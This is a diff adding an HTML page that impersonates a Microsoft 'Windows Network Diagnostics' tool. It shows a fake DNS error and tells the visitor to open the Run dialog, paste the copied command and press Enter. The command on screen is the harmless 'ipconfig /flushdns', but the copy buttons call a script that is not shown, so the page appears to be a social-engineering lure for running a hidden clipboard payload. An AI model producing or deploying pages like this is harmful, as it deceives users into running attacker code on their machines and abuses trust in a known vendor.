@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Windows Network Diagnostics</title>
+<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="card">
+
+<div class="header">
+
+<div class="title">
+<div class="windows">
+<div></div><div></div>
+<div></div><div></div>
+</div>
+
+Windows Network Diagnostics
+
+</div>
+
+<div class="publisher">
+Publisher: Microsoft Windows
+</div>
+
+</div>
+
+
+<div class="warning">
+⚠️
+
+<div>
+<b>Your connection may be limited</b>
+
+<p>
+Windows detected a DNS configuration error that prevents secure browsing.
+This can happen after recent updates.
+</p>
+
+</div>
+
+</div>
+
+
+
+<div class="result">
+
+<div class="label">
+Diagnostic Result
+</div>
+
+<h3>
+DNS_PROBE_FINISHED_NO_INTERNET
+</h3>
+
+<p>
+The DNS server isn't responding — this is often caused by corrupted DNS cache.
+</p>
+
+</div>
+
+
+
+
+<h3>ⓘ Quick fix (recommended by Microsoft)</h3>
+
+
+<div class="steps">
+
+<p>1️⃣ Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog</p>
+
+<p>2️⃣ Click the command box below, then press <kbd>Ctrl</kbd> + <kbd>V</kbd></p>
+
+<p>3️⃣ Press <kbd>Enter</kbd></p>
+
+</div>
+
+
+
+<div class="terminal">
+
+<code id="cmd">
+ipconfig /flushdns
+</code>
+
+
+<button onclick="copyCmd()" id="copy">
+Copy
+</button>
+
+
+</div>
+
+
+
+<button class="main" onclick="copyCmd()">
+
+Copy command & open Run dialog
+
+</button>
+
+
+
+</div>
+
+
+<script src="script.js"></script>
+
+</body>
+</html>
